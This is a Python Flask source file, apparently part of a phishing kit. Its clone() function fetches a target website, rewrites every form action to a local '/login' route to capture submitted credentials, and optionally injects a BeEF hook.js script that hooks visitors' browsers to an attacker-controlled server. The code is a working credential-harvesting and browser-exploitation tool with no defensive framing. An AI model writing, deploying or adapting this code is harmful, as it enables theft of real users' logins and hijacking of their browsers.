import requests
import re
import os

from flask import current_app

# CLONING FUNCTIONS --------------------------------------------------------------------------------------------
def clone(url, user_agent, beef):
    try:        
        u = url.replace('://', '-')
        templates_path = os.path.join(current_app.root_path, current_app.template_folder)
        q = "{}/fake/{}/{}".format(templates_path, user_agent, u)
        os.makedirs(q, exist_ok=True)
        temp_ind_path = "{}/fake/{}/{}/index.html".format(templates_path, user_agent, u)
        headers = {'User-Agent': user_agent}
        r = requests.get(url, headers=headers)
        html = r.text        
        old_regular = re.findall(r'action="([^ >"]*)"',html)
        new_regular = '/login'
        for r in old_regular:         
            print(r)
            html = html.replace(r, new_regular)
        if beef == 'yes':
            inject = '<script src=":3000/hook.js" type="text/javascript"></script></body>'
            html = html.replace("</body>", inject)
        new_html = open(temp_ind_path, 'w')
        new_html.write(html.encode('ascii', 'ignore').decode('ascii'))
        new_html.close()
    except:
        pass
#--------------------------------------------------------------------------------------------------------------------